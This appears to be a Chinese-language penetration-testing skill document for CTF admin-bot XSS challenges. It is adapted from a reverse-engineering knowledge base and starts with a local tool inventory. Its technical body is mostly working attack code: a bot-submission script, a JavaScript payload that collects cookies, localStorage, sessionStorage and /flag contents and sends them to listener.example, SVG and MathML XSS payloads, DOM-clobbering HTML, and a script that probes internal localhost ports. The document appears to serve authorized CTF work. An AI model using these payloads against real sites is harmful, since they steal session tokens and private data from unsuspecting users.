# Admin Bot / XSS 实战

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/07-client/admin-bot-xss.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **能力域**：本文为技术能力说明，按项目 `scope.md` 直接套用。
> **什么时候用**：命中「XSS / admin bot / CSP bypass / DOM clobbering」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- XSS
- admin bot
- CSP bypass
- DOM clobbering
- 跨站脚本
- exfiltration
- sanitizer bypass
- headless chrome

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：

| 工具 | 本机状态 | 本机命令 / 替代方案 |
|---|---|---|
| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |

- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。


## 步骤

本文正文按下列小节顺序推进，**每一步的完整命令与脚本在「技术正文」对应小节里**（这类文档以代码体 + 表格为主，按小节读比按 bullet 读快）：

1. 工作流
2. 判定矩阵
3. Bot 提交器 — 成功样本：提交后 listener 收到 bot 访问，或目标队列返回 visit id。失败样本：只返回 URL syntax error、协议被过滤、队列存在但 listener 没有访问。
4. 外带通道选择器
5. CSP 与 gadget 选择
6. DOM Clobbering 与同源动作 — 当脚本不可直接执行但 HTML 可注入时，优先影响目标代码已经读取的全局变量、form、anchor、config。
7. 内网与同源探测 — 成功样本：端口时间差稳定、同源 API 响应被外带、flag/token 到达 listener。失败样本：listener 无访问、只有普通用户访问、bot 不执行脚本、同源 fetch body 为空。

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **命中样本** — bot 访问 listener，带 HeadlessChrome UA
- **失败样本** — 只做服务端 URL 抓取，不执行 JS
- **命中样本** — payload 在 bot 环境触发 listener
- **失败样本** — 用户浏览器触发，bot 不触发
- **命中样本** — fetch 响应可外带
- **失败样本** — CORS/Origin/CSRF 阻断同源状态
- **命中样本** — JWT/access_token 可重放
- **失败样本** — token 只用于 UI，API 依赖 cookie
- **命中样本** — 至少一个外带通道被允许
- **失败样本** — 所有外链被拦，转 same-origin sink
- **命中样本** — 127.0.0.1 或内网服务响应差异
- **失败样本** — bot 网络与公网一致
- **listener 现象** — fetch/sendBeacon 到达
- **listener 现象** — 只有 image 到达

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

Admin Bot 本质是一个带高权限状态的浏览器。`alert(1)` 只是入口，真正的目标是拿到 bot 才能访问的同源数据、前端状态、token、内部面板或 flag。

## 输入信号

| 信号 | 立即动作 | 命中样本 | 失败样本 |
|---|---|---|---|
| 有 `/report`、`/submit`、`/visit` 让 bot 访问 URL | 枚举提交参数、等待时间、可访问协议 | bot 访问 listener，带 HeadlessChrome UA | 只做服务端 URL 抓取，不执行 JS |
| 反射/存储 HTML 注入 | 先测 parser 与 sanitizer，再测外带通道 | payload 在 bot 环境触发 listener | 用户浏览器触发，bot 不触发 |
| Cookie 为 HttpOnly | 走同源 fetch 读 `/flag`、`/api/me`、`/admin` | fetch 响应可外带 | CORS/Origin/CSRF 阻断同源状态 |
| token 在 localStorage/sessionStorage | 注入运行时快照 | JWT/access_token 可重放 | token 只用于 UI，API 依赖 cookie |
| CSP 存在 | 按 `connect-src/img-src/form-action/script-src` 路由 | 至少一个外带通道被允许 | 所有外链被拦，转 same-origin sink |
| bot 可能有内网视角 | 端口/路径时间差探测 | 127.0.0.1 或内网服务响应差异 | bot 网络与公网一致 |

## 工作流

```text
确认 bot 会执行 JS
  → 读取 CSP/cookie/storage/API baseline
  → 选择外带通道或同源读取
  → 构造最短 payload
  → 提交给 bot 并等待 listener
  → 按响应推进 JWT、CSRF、内网或 postMessage 链
```

## 0. 判定矩阵

| 约束 | 首选路线 | 备选路线 |
|---|---|---|
| `connect-src` 允许外域 | `fetch/sendBeacon/WebSocket` | image/form |
| 只允许 `img-src` | image beacon、DNS label | 同源缓存写入后读 |
| 只允许 `form-action` | 隐藏表单 POST | `window.name` 中转 |
| `script-src` 禁 inline | SVG/MathML/gadget/DOM clobbering | 存储型页面二跳 |
| Cookie HttpOnly | 同源 API 读取后外带响应 | CSRF 动作 + 状态差分 |
| 无外带域 | same-origin 写入可读位置 | 把 flag 放入 profile/comment/log 再读 |

## 1. Bot 提交器

```python
#!/usr/bin/env python3
import argparse
import json
import requests

def submit(url, target, mode):
    if mode == "json":
        return requests.post(url, json={"url": target}, timeout=10)
    if mode == "graphql":
        return requests.post(url, json={"query": f'mutation{{visit(url:"{target}"){{ok}}}}'}, timeout=10)
    return requests.post(url, data={"url": target}, timeout=10)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--submit-url", required=True)
    ap.add_argument("--target-url", required=True)
    ap.add_argument("--mode", choices=["form", "json", "graphql"], default="form")
    args = ap.parse_args()
    r = submit(args.submit_url, args.target_url, args.mode)
    print(json.dumps({"status": r.status_code, "location": r.headers.get("Location", ""), "body": r.text[:500]}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

成功样本：提交后 listener 收到 bot 访问，或目标队列返回 visit id。失败样本：只返回 URL syntax error、协议被过滤、队列存在但 listener 没有访问。

## 2. 外带通道选择器

```javascript
(() => {
  const L = "https://listener.example/collect";
  const pack = async () => {
    let same = "";
    try {
      same = await fetch("/flag", {credentials: "include"}).then(r => r.text());
    } catch (e) {
      same = String(e);
    }
    return btoa(unescape(encodeURIComponent(JSON.stringify({
      href: location.href,
      cookie: document.cookie,
      local: {...localStorage},
      session: {...sessionStorage},
      same: same.slice(0, 1200)
    }))).replace(/=+$/, "");
  };
  pack().then(d => {
    navigator.sendBeacon && navigator.sendBeacon(L, d);
    fetch(L + "?f=" + d, {mode: "no-cors"}).catch(() => {});
    (new Image()).src = L + "/i/" + d.slice(0, 1800);
    const f = document.createElement("form");
    f.method = "POST"; f.action = L; f.target = "_self";
    const i = document.createElement("input"); i.name = "d"; i.value = d;
    f.appendChild(i); document.body.appendChild(f);
    setTimeout(() => f.submit(), 50);
  });
})();
```

判定：

| listener 现象 | 解释 |
|---|---|
| fetch/sendBeacon 到达 | `connect-src` 可用，继续读同源 API |
| 只有 image 到达 | `img-src` 可用，分片外带 |
| 只有 form 到达 | `form-action` 可用，用 POST 带长响应 |
| 都不到达 | CSP/网络阻断，转同源写入或 DNS label |

## 3. CSP 与 gadget 选择

| CSP 形态 | Payload 族 |
|---|---|
| `script-src 'unsafe-inline'` | 直接 `<script>` 或事件处理器 |
| `script-src 'self'` | 找同源 JSONP、Angular/React/Vue gadget、上传 JS |
| `img-src *` | image beacon 外带 |
| `connect-src *` | fetch/WebSocket 外带 |
| `base-uri` 缺失 | `<base href>` 改相对资源加载 |
| `trusted-types` 存在 | 找已有 policy 或 DOM sink 二跳 |

```html
<svg><animate attributeName="x" onbegin="fetch('/flag',{credentials:'include'}).then(r=>r.text()).then(t=>location='https://listener.example/?d='+btoa(t))"></animate></svg>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror="fetch('/flag').then(r=>r.text()).then(t=>new Image().src='https://listener.example/i?d='+btoa(t))">-->
```

## 4. DOM Clobbering 与同源动作

当脚本不可直接执行但 HTML 可注入时，优先影响目标代码已经读取的全局变量、form、anchor、config。

```html
<form id=config><input name=isAdmin value=true><input name=apiBase value=/admin></form>
<a id=redirect_uri href="javascript:fetch('/flag').then(r=>r.text()).then(t=>location='https://listener.example/?d='+btoa(t))"></a>
<iframe name=csrf_token srcdoc="<input id=x value=owned>"></iframe>
```

## 5. 内网与同源探测

```javascript
async function probe() {
  const ports = [80, 443, 3000, 5000, 6379, 8000, 8080, 9222];
  const out = [];
  for (const p of ports) {
    const t0 = performance.now();
    try {
      await fetch(`http://127.0.0.1:${p}/`, {mode: "no-cors", cache: "no-store"});
      out.push({port: p, dt: Math.round(performance.now() - t0), hit: true});
    } catch (e) {
      out.push({port: p, dt: Math.round(performance.now() - t0), hit: false});
    }
  }
  new Image().src = "https://listener.example/p?" + btoa(JSON.stringify(out));
}
probe();
```

成功样本：端口时间差稳定、同源 API 响应被外带、flag/token 到达 listener。失败样本：listener 无访问、只有普通用户访问、bot 不执行脚本、同源 fetch body 为空。

## 攻击链

```text
XSS 注入
  → bot 执行 JS
  → 读取同源 /flag 或前端 token
  → 选择可用外带通道
  → listener 收到响应
  → JWT 重放 / CSRF 动作 / 内网探测 / postMessage 二跳
```

## Evidence

| 项 | 记录内容 |
|---|---|
| bot 触发 | 提交 URL、队列响应、listener 时间、UA、IP、Referer |
| 注入点 | URL、参数、payload、渲染上下文、sanitizer 输出 |
| CSP 路由 | CSP header/meta、可用外带通道、失败通道 |
| 同源读取 | 被读取路径、状态码、响应 hash、关键字段 |
| 成功样本 | flag/token/admin 数据到达 listener，或同源动作产生状态变化 |
| 失败样本 | CSP 拦截、bot 不执行 JS、cookie 不随请求、响应 hash 固定拒绝 |
| 下一跳 | token 转 JWT 07；postMessage 转本目录 postmessage；内网转 SSRF/infra |
